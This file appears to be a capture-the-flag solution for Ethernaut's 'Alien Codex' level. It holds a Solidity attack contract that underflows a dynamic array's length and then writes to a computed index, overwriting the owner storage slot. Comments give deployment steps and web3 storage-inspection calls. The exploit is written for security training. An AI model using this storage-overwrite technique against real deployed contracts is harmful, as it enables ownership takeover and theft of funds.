// 1 - Deploy this contract - Remix
// 2 - Call attack()

pragma solidity ^0.5.0;

interface IAlienCodex {
    function make_contact() external;

    function retract() external;

    function revise(uint256 i, bytes32 _content) external;
}

contract AlienCodexAttack {
    IAlienCodex public alienCodex;

    constructor(address challengeAddress) public {
        alienCodex = IAlienCodex(challengeAddress); //
    }

    function attack() public {
        alienCodex.make_contact();
        alienCodex.retract();
        alienCodex.revise(
            (2**256 - 1) - uint256(keccak256(uint256(0x01))) + 1,
            bytes32(uint256(msg.sender))
        );
    }
}

// Analysis:

// await web3.eth.getStorageAt(instance, 0)
// '0x000000000000000000000001da5b3fb76c78b6edee6be8f11a1c31ecfb02b272'

// await web3.eth.getStorageAt(instance, 1)
// '0x0000000000000000000000000000000000000000000000000000000000000000'

// await contract.record("0x0000000000000000000000000000000000000000000000000000000000000061")

// await web3.eth.getStorageAt(instance, 1)
// '0x0000000000000000000000000000000000000000000000000000000000000001'

// uint256(keccak256(1))
// await web3.eth.getStorageAt(instance, web3.utils.toBN("80084422859880547211683076133703299733277748156566366325829078699459944778998"))
// '0x0000000000000000000000000000000000000000000000000000000000000061'

// await contract.retract()

// await web3.eth.getStorageAt(instance, 1)
// '0x0000000000000000000000000000000000000000000000000000000000000000'

// await web3.eth.getStorageAt(instance, web3.utils.toBN("80084422859880547211683076133703299733277748156566366325829078699459944778998"))
// '0x0000000000000000000000000000000000000000000000000000000000000000'
